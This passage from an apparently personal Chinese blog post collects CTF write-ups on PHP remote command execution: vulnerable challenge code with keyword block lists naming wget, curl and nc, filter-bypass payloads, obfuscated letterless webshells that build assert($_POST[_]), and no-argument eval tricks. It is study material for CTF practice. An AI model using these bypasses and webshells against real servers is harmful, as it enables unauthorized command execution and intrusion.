<td align="left">删除从右边开始最后一个 <code>.</code> 及其右边内容</td>
<td align="left"><code>/usr/local/src/backup</code></td>
<td align="left">去掉所有后缀</td>
</tr>
</tbody></table>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">str=<span class="string">&quot;123456789&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;str:0:3&#125;</span>   <span class="comment"># 从第 0 位开始，取 3 个字符 -&gt; &quot;123&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;str:5&#125;</span>     <span class="comment"># 从第 5 位开始，取到最后 -&gt; &quot;6789&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;str: -2&#125;</span>   <span class="comment"># 取最后 2 个字符 (注意冒号后有空格) -&gt; &quot;89&quot;</span></span><br></pre></td></tr></table></figure>



<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><h5 id="ctfhub最后关"><a href="#ctfhub最后关" class="headerlink" title="ctfhub最后关"></a>ctfhub最后关</h5><p><img src="/2026/01/01/rce-plus/rce1.png"><br>最终payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ip=127.0.0.1%0acd%09fl\ag_is_here%0aca\t%09f*</span><br></pre></td></tr></table></figure>
<p>使用url编码%0a代替换行符截断命令<br>%09代替空格<br>\截断关键字<br>*通配文件</p>
<h5 id="2025H-NCTF"><a href="#2025H-NCTF" class="headerlink" title="2025H&amp;NCTF"></a>2025H&amp;NCTF</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;Number&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$inputNumber</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;Number&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\d/&#x27;</span>, <span class="variable">$inputNumber</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;不行不行,不能这样&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">intval</span>(<span class="variable">$inputNumber</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;OK,接下来你知道该怎么做吗&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$cmd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(</span><br><span class="line">                <span class="string">&#x27;/wget|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\\*|sort|zip|mod|sl|find|sed|cp|mv|ty|php|tee|txt|grep|base|fd|df|\\\\|more|cc|tac|less|head|\.|\&#123;|\&#125;|uniq|copy|%|file|xxd|date|\[|\]|flag|bash|env|!|\?|ls|\&#x27;|\&quot;|id/i&#x27;</span>,</span><br><span class="line">                <span class="variable">$cmd</span></span><br><span class="line">            )) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;你传的参数似乎挺正经的,放你过去吧&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;nonono,hacker!!!&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>传参 <code>?Number[]=1</code> 以绕过第一个 <code>preg_match</code><br>接下来过滤了很多命令，<br>但是可以通过设置变量的形式绕过<br>例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd=l=l;s=s;($l$s) //ls</span><br></pre></td></tr></table></figure>
<p>那么拼一个find然后用管道符传给xrag即可</p>
<h5 id="2025cuit网安院ctf"><a href="#2025cuit网安院ctf" class="headerlink" title="2025cuit网安院ctf"></a>2025cuit网安院ctf</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$passed</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] !== <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;You Win！&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$passed</span> = <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;You lose！&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;d0g3&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$passed</span> || <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;passed&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$input</span> = <span class="variable">$_GET</span>[<span class="string">&quot;d0g3&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/et|echo|cat|tac|base|sh|tar|more|less|tail|nl|fl|vi|head|env|&amp;|%26|\||;|\^|\&#x27;|\]|&quot;|&lt;|&gt;|`|\/| |\\\\|\*/i&#x27;</span>, <span class="variable">$input</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;gun gun !&quot;</span>;</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;^_^!&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$input</span>);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;你还没通过第一关！&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>隔壁实验室出的一道简单题目，线下赛没打通有点耻辱了，也是总结这篇笔记的初衷</p>
<p>第一关过不过好像无所谓，直接传个passed也能解决，需要过的话可以使用数组绕过，</p>
<p>也可以使用0e科学计数法绕过</p>
<p>然后就进入了rce环节，管道符，通配符，正斜杠，尖括号，这些都没有，命令可以使用变量扩展解决</p>
<p>空格使用%09绕过，分隔符使用%0a绕过，最终需要构造这个命令：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">cd ..;cd ..;cd ..;cat flag</span><br></pre></td></tr></table></figure>

<p>使用上述的替换方式替换即可：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">d0g3=cd%<span class="number">09</span>..%<span class="number">0</span>acd%<span class="number">09</span>..%<span class="number">0</span>acd%<span class="number">09</span>..%<span class="number">0</span>al=l%<span class="number">0</span><span class="keyword">as</span>=s%<span class="number">0</span>a$l<span class="variable">$s</span> <span class="comment">//列目录</span></span><br><span class="line">d0g3=cd%<span class="number">09</span>..%<span class="number">0</span>acd%<span class="number">09</span>..%<span class="number">0</span>acd%<span class="number">09</span>..%<span class="number">0</span>al=lag%<span class="number">0</span>af=f%<span class="number">0</span>ac=ca%<span class="number">0</span>at=t%<span class="number">0</span>a$c<span class="variable">$t</span>%<span class="number">09</span>$f<span class="variable">$l</span> <span class="comment">//读取  </span></span><br></pre></td></tr></table></figure>



<h1 id="无字母数字RCE"><a href="#无字母数字RCE" class="headerlink" title="无字母数字RCE:"></a>无字母数字RCE:</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/pursue-security/p/15404150.html">https://www.cnblogs.com/pursue-security/p/15404150.html</a><br>源码大致:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>核心思路是异或、取反、自增</p>
<p>例如要构造 <code>assert($_POST[_])</code><br>a:’%40’^’%21’ ; s:’%7B’^’%08’ ; s:’%7B’^’%08’ ; e:’%7B’^’%1E’ ; r:’%7E’^’%0C’ ; t:’%7C’^’%08’<br>P:’%0D’^’%5D’ ; O:’%0F’^’%40’ ; S:’%0E’^’%5D’ ; T:’%0B’^’%5F’<br>拼接起来：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_</span>=(<span class="string">&#x27;%40&#x27;</span>^<span class="string">&#x27;%21&#x27;</span>).(<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%08&#x27;</span>).(<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%08&#x27;</span>).(<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%1E&#x27;</span>).(<span class="string">&#x27;%7E&#x27;</span>^<span class="string">&#x27;%0C&#x27;</span>).(<span class="string">&#x27;%7C&#x27;</span>^<span class="string">&#x27;%08&#x27;</span>);  <span class="comment">// $_=assert</span></span><br><span class="line"><span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;%0D&#x27;</span>^<span class="string">&#x27;%5D&#x27;</span>).(<span class="string">&#x27;%0F&#x27;</span>^<span class="string">&#x27;%40&#x27;</span>).(<span class="string">&#x27;%0E&#x27;</span>^<span class="string">&#x27;%5D&#x27;</span>).(<span class="string">&#x27;%0B&#x27;</span>^<span class="string">&#x27;%5F&#x27;</span>);  <span class="comment">// $__=_POST</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$$__</span>; <span class="comment">//$___=$_POST</span></span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$___</span>[_]);<span class="comment">//assert($_POST[_]);</span></span><br></pre></td></tr></table></figure>

<p>不过这样好像有数字啊<br>但还有用汉字的:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_</span>++;                <span class="comment">//得到1，此时$_=1</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;极&quot;</span>;</span><br><span class="line"><span class="variable">$___</span> = ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到a，此时$___=&quot;a&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;区&quot;</span>;</span><br><span class="line"><span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到s，此时$___=&quot;as&quot;</span></span><br><span class="line"><span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//此时$___=&quot;ass&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;皮&quot;</span>;</span><br><span class="line"><span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到e，此时$___=&quot;asse&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;十&quot;</span>;</span><br><span class="line"><span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到r，此时$___=&quot;asser&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;勺&quot;</span>;</span><br><span class="line"><span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到t，此时$___=&quot;assert&quot;</span></span><br><span class="line"><span class="variable">$____</span> = <span class="string">&#x27;_&#x27;</span>;          <span class="comment">//$____=&#x27;_&#x27;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;寸&quot;</span>;</span><br><span class="line"><span class="variable">$____</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到P，此时$____=&quot;_P&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;小&quot;</span>;</span><br><span class="line"><span class="variable">$____</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到O，此时$____=&quot;_PO&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;欠&quot;</span>;</span><br><span class="line"><span class="variable">$____</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到S，此时$____=&quot;_POS&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;立&quot;</span>;</span><br><span class="line"><span class="variable">$____</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到T，此时$____=&quot;_POST&quot;</span></span><br><span class="line"><span class="variable">$_</span> = <span class="variable">$$____</span>;           <span class="comment">//$_ = $_POST</span></span><br><span class="line"><span class="variable">$___</span>(<span class="variable">$_</span>[_]);           <span class="comment">//assert($_POST[_])</span></span><br></pre></td></tr></table></figure>
<p>使用自增的:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_</span>=[];</span><br><span class="line"><span class="variable">$_</span>=@<span class="string">&quot;<span class="subst">$_</span>&quot;</span>; <span class="comment">// $_=&#x27;Array&#x27;;</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;@&#x27;</span>]; <span class="comment">// $_=$_[0];</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$_</span>; <span class="comment">// A</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// E </span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// R</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// T</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$____</span>=<span class="string">&#x27;_&#x27;</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// P</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// O</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// T</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$$____</span>;</span><br><span class="line"><span class="variable">$___</span>(<span class="variable">$_</span>[_]); <span class="comment">// ASSERT($_POST[_]);</span></span><br></pre></td></tr></table></figure>
<h1 id="无参RCE"><a href="#无参RCE" class="headerlink" title="无参RCE"></a>无参RCE</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/pursue-security/p/15406272.html">https://www.cnblogs.com/pursue-security/p/15406272.html</a><br>过滤源码类似:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>要执行的代码只能是 <code>a(b(c()));</code> 这种形式<br>一种方法是利用 <code>getallheader();</code><br>然后使用 <code>end()</code> 或 <code>reset()</code> 取出首&#x2F;尾元素</p>
<ul>
<li>end() - 将内部指针指向数组中的最后一个元素，并输出。</li>
<li>next() - 将内部指针指向数组中的下一个元素，并输出。</li>
<li>prev() - 将内部指针指向数组中的上一个元素，并输出。</li>
<li>reset() - 将内部指针指向数组中的第一个元素，并输出。</li>
<li>each() - 返回当前元素的键名和键值，并将内部指针向前移动。</li>
</ul>
<p>与php版本有关<br>php5似乎不能使用getallheader<br>php7会把注入请求头放在最前面<br>不知道文章博主是什么版本<br>我的payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=eval(reset(getallheaders()));</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aaa:system(&quot;dir&quot;);</span><br></pre></td></tr></table></figure>

<p>那么同理:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">get_defined_vars</span>())));<span class="comment">//包含get、post、cookie、file四个参数</span></span><br></pre></td></tr></table></figure>

<p>还可以利用cookie中的session_id：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">session_id</span>()))<span class="comment">//php的cookie中的session id</span></span><br></pre></td></tr></table></figure>

<p>利用 <code>localeconv</code> 获取 <code>.</code> 以直接读取文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>())) <span class="comment">//.</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>())) <span class="comment">//列当前目录</span></span><br></pre></td></tr></table></figure>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://ireel.github.io">ivory</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://ireel.github.io/2026/01/01/rce-plus/">http://ireel.github.io/2026/01/01/rce-plus/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://ireel.github.io" target="_blank">ivory's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/rce/">rce</a><a class="post-meta__tags" href="/tags/linux/">linux</a></div><div class="post-share"><div class="social-share" data-image="/img/bash.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/12/29/python-sandbox/" title="python沙箱逃逸"><img class="cover" src="/img/logo/Python.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">python沙箱逃逸</div></div><div class="info-2"><div class="info-item-1">Python 沙箱逃逸栈帧逃逸2025 mini-L pyboximport multiprocessingimport sysimport ioimport astclass SandboxVisitor(ast.NodeVisitor):    forbidden_attrs = &#123;        &quot;__class__&quot;, &quot;__dict__&quot;, &quot;__bases__&quot;, &quot;__mro__&quot;, &quot;__subclasses__&quot;,        &quot;__globals__&quot;, &quot;__code__&quot;, &quot;__closure__&quot;, &quot;__func__&quot;, &quot;__self__&quot;,        &quot;__module__&quot;, &quot;__import__&quot;, &quot;__builtins__&quot;,...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/head.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">ivory</div><div class="author-info-description">或许你的思绪也能存活千年</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">22</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ireel"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#RCE%E8%A1%A5%E8%AF%BE"><span class="toc-number">1.</span> <span class="toc-text">RCE补课</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#linux-shell"><span class="toc-number">2.</span> <span class="toc-text">linux shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%9E%90%E5%91%BD%E4%BB%A4%E7%9A%84%E8%BF%87%E7%A8%8B"><span class="toc-number">2.0.1.</span> <span class="toc-text">解析命令的过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E7%AC%A6%E5%8F%B7%E4%B8%8E%E7%89%B9%E6%AE%8A%E5%8F%98%E9%87%8F"><span class="toc-number">2.0.2.</span> <span class="toc-text">特殊符号与特殊变量</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E9%93%BE%E6%8E%A5%E7%AC%A6"><span class="toc-number">2.0.2.0.1.</span> <span class="toc-text">命令链接符</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%80%9A%E9%85%8D%E7%AC%A6"><span class="toc-number">2.0.2.0.2.</span> <span class="toc-text">通配符</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E6%89%A7%E8%A1%8C"><span class="toc-number">2.0.2.0.3.</span> <span class="toc-text">动态执行</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B0%96%E6%8B%AC%E5%8F%B7%E5%A4%A7%E5%85%A8"><span class="toc-number">2.0.2.0.4.</span> <span class="toc-text">尖括号大全</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%85%B6%E4%BB%96"><span class="toc-number">2.0.2.0.5.</span> <span class="toc-text">其他</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%85%B3%E9%94%AE%E5%AD%97%E6%88%96%E7%AC%A6%E5%8F%B7"><span class="toc-number">3.</span> <span class="toc-text">绕过关键字或符号</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" 